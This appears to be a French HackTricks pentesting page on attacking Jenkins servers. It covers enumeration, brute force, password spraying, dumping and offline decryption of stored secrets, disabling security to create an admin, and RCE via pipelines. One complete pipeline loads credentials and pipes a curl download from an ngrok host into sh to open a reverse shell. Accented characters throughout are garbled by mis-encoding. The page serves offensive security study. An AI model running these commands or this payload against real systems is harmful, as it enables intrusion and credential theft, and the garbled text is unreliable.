# S√©curit√© Jenkins

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informations de base

Jenkins est un outil qui offre une m√©thode simple pour √©tablir un environnement de **continuous integration** ou **continuous delivery** (CI/CD) pour presque **toute** combinaison de **langages de programmation** et de d√©p√¥ts de code source en utilisant des pipelines. De plus, il automatise diverses t√¢ches de d√©veloppement routini√®res. Bien que Jenkins n'√©limine pas le **besoin de cr√©er des scripts pour les √©tapes individuelles**, il fournit un moyen plus rapide et plus robuste d'int√©grer toute la s√©quence d'outils de construction, de test et de d√©ploiement que l'on peut facilement construire manuellement.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## √ânum√©ration non authentifi√©e

Pour rechercher des pages Jenkins int√©ressantes sans authentification comme (_/people_ ou _/asynchPeople_, cela liste les utilisateurs actuels) vous pouvez utiliser :
```
msf> use auxiliary/scanner/http/jenkins_enum
```
V√©rifiez si vous pouvez ex√©cuter des commandes sans avoir besoin d'authentification :
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sans identifiants, vous pouvez regarder √† l'int√©rieur du chemin _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ pour des **noms d'utilisateur**.

Vous pouvez √™tre en mesure d'obtenir la version de Jenkins √† partir du chemin _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Vuln√©rabilit√©s Connues

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Connexion

Dans les informations de base, vous pouvez v√©rifier **toutes les fa√ßons de se connecter √† Jenkins** :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Enregistrement

Vous pourrez trouver des instances Jenkins qui **vous permettent de cr√©er un compte et de vous y connecter. Aussi simple que cela.**

### **Connexion SSO**

Aussi, si la **fonctionnalit√©**/**plugins SSO** √©taient pr√©sents, vous devriez tenter de **vous connecter** √† l'application en utilisant un compte de test (par exemple, un compte de test **Github/Bitbucket**). Astuce de [**ici**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** manque de **politique de mot de passe** et de **mitigation de brute-force de nom d'utilisateur**. Il est essentiel de **brute-forcer** les utilisateurs puisque des **mots de passe faibles** ou des **noms d'utilisateur comme mots de passe** peuvent √™tre utilis√©s, m√™me des **noms d'utilisateur invers√©s comme mots de passe**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Utilisez [ce script python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ou [ce script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Contournement de la liste blanche d'IP

De nombreuses organisations combinent des **syst√®mes de gestion de contr√¥le de source (SCM) bas√©s sur SaaS** tels que GitHub ou GitLab avec une **solution CI interne auto-h√©berg√©e** comme Jenkins ou TeamCity. Cette configuration permet aux syst√®mes CI de **recevoir des √©v√©nements webhook des fournisseurs de contr√¥le de source SaaS**, principalement pour d√©clencher des jobs de pipeline.

Pour ce faire, les organisations **mettent en liste blanche** les **plages d'IP** des **plateformes SCM**, leur permettant d'acc√©der au **syst√®me CI interne** via des **webhooks**. Cependant, il est important de noter que **n'importe qui** peut cr√©er un **compte** sur GitHub ou GitLab et le configurer pour **d√©clencher un webhook**, envoyant potentiellement des requ√™tes au **syst√®me CI interne**.

V√©rifiez : [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Abus de Jenkins interne

Dans ces sc√©narios, nous allons supposer que vous avez un compte valide pour acc√©der √† Jenkins.

{% hint style="warning" %}
En fonction du m√©canisme d'**autorisation** configur√© dans Jenkins et des permissions de l'utilisateur compromis, vous **pourriez ou non √™tre en mesure d'effectuer les attaques suivantes.**
{% endhint %}

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Lister les utilisateurs

Si vous avez acc√©d√© √† Jenkins, vous pouvez lister les autres utilisateurs enregistr√©s sur [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping des builds pour trouver des secrets en clair

Utilisez [ce script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) pour dumper les sorties de console des builds et les variables d'environnement des builds afin de trouver des secrets en clair.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Vol de Credentials SSH**

Si l'utilisateur compromis a **suffisamment de privil√®ges pour cr√©er/modifier un nouveau n≈ìud Jenkins** et que des credentials SSH sont d√©j√† stock√©s pour acc√©der √† d'autres n≈ìuds, il pourrait **voler ces credentials** en cr√©ant/modifiant un n≈ìud et en **configurant un h√¥te qui enregistrera les credentials** sans v√©rifier la cl√© de l'h√¥te :

![](<../../.gitbook/assets/image (218).png>)

Vous trouverez g√©n√©ralement les credentials ssh Jenkins dans un **fournisseur global** (`/credentials/`), vous pouvez donc √©galement les extraire comme vous le feriez pour tout autre secret. Plus d'informations dans la [**section Dumping secrets**](./#dumping-secrets).

### **RCE dans Jenkins**

Obtenir un **shell sur le serveur Jenkins** donne √† l'attaquant l'opportunit√© de divulguer tous les **secrets** et **variables d'environnement** et d'**exploiter d'autres machines** situ√©es dans le m√™me r√©seau ou m√™me de **r√©cup√©rer des credentials cloud**.

Par d√©faut, Jenkins **s'ex√©cutera en tant que SYSTEM**. Donc, le compromettre donnera √† l'attaquant des **privil√®ges SYSTEM**.

### **RCE Cr√©ation/Modification d'un projet**

Cr√©er/Modifier un projet est un moyen d'obtenir un RCE sur le serveur Jenkins :

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Ex√©cution de script Groovy**

Vous pouvez √©galement obtenir un RCE en ex√©cutant un script Groovy, ce qui pourrait √™tre plus furtif que de cr√©er un nouveau projet :

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Cr√©ation/Modification de Pipeline

Vous pouvez √©galement obtenir un **RCE en cr√©ant/modifiant un pipeline** :

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Exploitation de Pipeline

Pour exploiter les pipelines, vous devez toujours avoir acc√®s √† Jenkins.

### Pipelines de Build

Les **pipelines** peuvent √©galement √™tre utilis√©s comme **m√©canisme de build dans les projets**, dans ce cas, il peut √™tre configur√© un **fichier √† l'int√©rieur du d√©p√¥t** qui contiendra la syntaxe du pipeline. Par d√©faut, `/Jenkinsfile` est utilis√© :

![](<../../.gitbook/assets/image (127).png>)

Il est √©galement possible de **stocker les fichiers de configuration de pipeline √† d'autres endroits** (dans d'autres d√©p√¥ts par exemple) dans le but de **s√©parer** l'**acc√®s** au d√©p√¥t et l'acc√®s au pipeline.

Si un attaquant a **un acc√®s en √©criture sur ce fichier**, il pourra le **modifier** et **potentiellement d√©clencher** le pipeline sans m√™me avoir acc√®s √† Jenkins.\
Il est possible que l'attaquant doive **contourner certaines protections de branche** (selon la plateforme et les privil√®ges de l'utilisateur, elles pourraient √™tre contourn√©es ou non).

Les d√©clencheurs les plus courants pour ex√©cuter un pipeline personnalis√© sont :

* **Pull request** vers la branche principale (ou potentiellement vers d'autres branches)
* **Push vers la branche principale** (ou potentiellement vers d'autres branches)
* **Mettre √† jour la branche principale** et attendre qu'elle soit ex√©cut√©e d'une mani√®re ou d'une autre

{% hint style="info" %}
Si vous √™tes un **utilisateur externe**, vous ne devriez pas vous attendre √† cr√©er une **PR vers la branche principale** du d√©p√¥t d'un **autre utilisateur/organisation** et **d√©clencher le pipeline**... mais si c'est **mal configur√©**, vous pourriez **compromettre compl√®tement des entreprises simplement en exploitant cela**.
{% endhint %}

### Pipeline RCE

Dans la section RCE pr√©c√©dente, une technique a d√©j√† √©t√© indiqu√©e pour [**obtenir un RCE en modifiant un pipeline**](./#rce-creating-modifying-pipeline).

### V√©rification des variables d'environnement

Il est possible de d√©clarer des **variables d'environnement en clair** pour l'ensemble du pipeline ou pour des √©tapes sp√©cifiques. Ces variables d'environnement **ne devraient pas contenir d'informations sensibles**, mais un attaquant pourrait toujours **v√©rifier toute la configuration du pipeline/Jenkinsfiles** :
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Pour des informations sur la mani√®re dont les secrets sont g√©n√©ralement trait√©s par Jenkins, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Les identifiants peuvent √™tre **port√©s √† des fournisseurs globaux** (`/credentials/`) ou √† des **projets sp√©cifiques** (`/job/<project-name>/configure`). Par cons√©quent, pour les exfiltrer tous, vous devez **compromettre au moins tous les projets** contenant des secrets et ex√©cuter des pipelines personnalis√©s/empoisonn√©s.

Il y a un autre probl√®me, pour obtenir un **secret √† l'int√©rieur de l'env** d'un pipeline, vous devez **conna√Ætre le nom et le type du secret**. Par exemple, si vous essayez de **charger** un **secret** de type **`usernamePassword`** en tant que **secret** de type **`string`**, vous obtiendrez cette **erreur** :
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Voici la fa√ßon de charger certains types de secrets courants :
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
√Ä la fin de cette page, vous pouvez **trouver tous les types d'identifiants** : [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La meilleure fa√ßon de **dumper tous les secrets en une fois** est de **compromettre** la machine **Jenkins** (en ex√©cutant un reverse shell dans le **n≈ìud int√©gr√©** par exemple) puis de **fuiter** les **cl√©s ma√Ætresses** et les **secrets chiffr√©s** et de les d√©chiffrer hors ligne.\
Plus d'informations sur comment faire cela dans la section [N≈ìuds & Agents](./#nodes-and-agents) et dans la section [Post Exploitation](./#post-exploitation).
{% endhint %}

### Triggers

D'apr√®s [la documentation](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) : La directive `triggers` d√©finit les **moyens automatis√©s par lesquels le Pipeline doit √™tre relanc√©**. Pour les Pipelines int√©gr√©s avec une source telle que GitHub ou BitBucket, `triggers` peut ne pas √™tre n√©cessaire car une int√©gration bas√©e sur des webhooks sera probablement d√©j√† pr√©sente. Les triggers actuellement disponibles sont `cron`, `pollSCM` et `upstream`.

Exemple de Cron :
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

Une **instance Jenkins** peut avoir **diff√©rents agents fonctionnant sur diff√©rentes machines**. Du point de vue d'un attaquant, l'acc√®s √† diff√©rentes machines signifie **diff√©rentes potentielles informations d'identification cloud** √† voler ou **diff√©rents acc√®s r√©seau** qui pourraient √™tre utilis√©s pour exploiter d'autres machines.

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Vous pouvez √©num√©rer les **n≈ìuds configur√©s** dans `/computer/`, vous trouverez g√©n√©ralement le \*\*`Built-In Node` \*\* (qui est le n≈ìud ex√©cutant Jenkins) et potentiellement plus :

![](<../../.gitbook/assets/image (249).png>)

Il est **particuli√®rement int√©ressant de compromettre le n≈ìud int√©gr√©** car il contient des informations sensibles de Jenkins.

Pour indiquer que vous souhaitez **ex√©cuter** le **pipeline** dans le **n≈ìud Jenkins int√©gr√©**, vous pouvez sp√©cifier la configuration suivante √† l'int√©rieur du pipeline :
```bash
pipeline {
agent {label 'built-in'}
```
### Exemple complet

Pipeline dans un agent sp√©cifique, avec un d√©clencheur cron, avec des variables d'environnement de pipeline et de stage, chargeant 2 variables dans une √©tape et envoyant un reverse shell :
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Secrets Jenkins

Vous pouvez lister les secrets en acc√©dant √† `/credentials/` si vous avez suffisamment de permissions. Notez que cela ne listera que les secrets √† l'int√©rieur du fichier `credentials.xml`, mais les **fichiers de configuration de build** peuvent √©galement contenir **plus de credentials**.

Si vous pouvez **voir la configuration de chaque projet**, vous pouvez √©galement y voir les **noms des credentials (secrets)** utilis√©s pour acc√©der au d√©p√¥t et **d'autres credentials du projet**.

![](<../../.gitbook/assets/image (180).png>)

#### Depuis Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Depuis le disque

Ces fichiers sont n√©cessaires pour **d√©crypter les secrets Jenkins** :

* secrets/master.key
* secrets/hudson.util.Secret

Ces **secrets peuvent g√©n√©ralement √™tre trouv√©s dans** :

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Voici une regex pour les trouver :
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### D√©crypter les secrets Jenkins hors ligne

Si vous avez extrait les **mots de passe n√©cessaires pour d√©crypter les secrets**, utilisez [**ce script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **pour d√©crypter ces secrets**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### D√©crypter les secrets Jenkins depuis Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Cr√©er un nouvel utilisateur admin

1. Acc√©dez au fichier config.xml de Jenkins dans `/var/lib/jenkins/config.xml` ou `C:\Program Files (x86)\Jenkis\`
2. Recherchez le mot `<useSecurity>true</useSecurity>` et changez le mot **`true`** en **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Red√©marrez** le serveur **Jenkins** : `service jenkins restart`
4. Maintenant, retournez sur le portail Jenkins et **Jenkins ne demandera pas de credentials** cette fois. Naviguez vers "**Manage Jenkins**" pour d√©finir √† nouveau le **mot de passe administrateur**.
5. **Activez** √† nouveau la **s√©curit√©** en changeant les param√®tres √† `<useSecurity>true</useSecurity>` et **red√©marrez Jenkins**.

## R√©f√©rences

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Apprenez et pratiquez AWS Hacking :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez GCP Hacking : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos github.

</details>
{% endhint %}
